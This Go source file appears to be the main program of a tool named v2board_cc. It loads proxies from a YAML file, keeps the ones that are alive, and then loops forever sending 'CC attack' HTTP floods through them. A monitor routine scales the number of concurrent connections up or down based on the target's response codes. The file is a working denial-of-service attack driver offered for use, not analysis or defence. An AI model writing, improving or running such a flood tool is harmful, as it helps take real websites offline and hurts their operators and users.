package main

import (
	"fmt"
	"io/ioutil"
	"sync"
	"time"

	"github.com/panjf2000/ants/v2"

	"github.com/thank243/v2board_cc/config"
	"github.com/thank243/v2board_cc/utils"
)

func main() {
	defer ants.Release()
	var wg sync.WaitGroup
	buf, err := ioutil.ReadFile("proxies.yaml")
	if err != nil {
		fmt.Println(err)
		return
	}
	r, err := config.UnmarshalRawConfig(buf)
	if err != nil {
		fmt.Println(err)
	}
	pMaps, err := config.ParseProxies(r)
	if err != nil {
		fmt.Println(err)
	}

	var PList []utils.Nodes
	for _, v := range pMaps {
		PList = append(PList, utils.Nodes{Proxy: v})
	}

	counts := 0
	var (
		alivePlist []*utils.Nodes
		status     int
	)

	pool1, _ := ants.NewPoolWithFunc(config.Cfg.Connections/3, func(i interface{}) {
		p := i.(utils.Nodes)
		aliveP, _ := utils.CCAttack(&p, &counts, &status)
		if aliveP != nil {
			alivePlist = append(alivePlist, aliveP)
		}
		wg.Done()
	})

	//initial alive proxies
	fmt.Println("Filtering alive nodes")
	for _, p := range PList {
		wg.Add(1)
		err = pool1.Invoke(p)
		if err != nil {
			fmt.Println(err.Error())
		}
	}
	wg.Wait()
	pool1.Release()

	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections/3, func(i interface{}) {
		p := i.(*utils.Nodes)
		_, _ = utils.CCAttack(p, &counts, &status)
		wg.Done()
	})

	//monitor status
	go func() {
		for {
			switch {
			case (status == 502 || status == 404) && pool2.Cap() > 32:
				pool2.Tune(pool2.Cap() - 10)
			case status < 500 && status > 0 && pool2.Cap() < 3*config.Cfg.Connections:
				pool2.Tune(pool2.Cap() + int(float64(config.Cfg.Connections)*0.2))
			}
			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d\n", counts, len(alivePlist), pool2.Running())
			time.Sleep(10 * time.Second)
		}
	}()

	fmt.Printf("Filtered %d nodes. Now starting fast CC attack after 5s!\n", len(alivePlist))
	for {
		fmt.Println("Batch Attack")
		for _, p := range alivePlist {
			wg.Add(1)
			err = pool2.Invoke(p)
			if err != nil {
				fmt.Println(err.Error())
			}
		}
		fmt.Println("Attack completed.")
	}
}
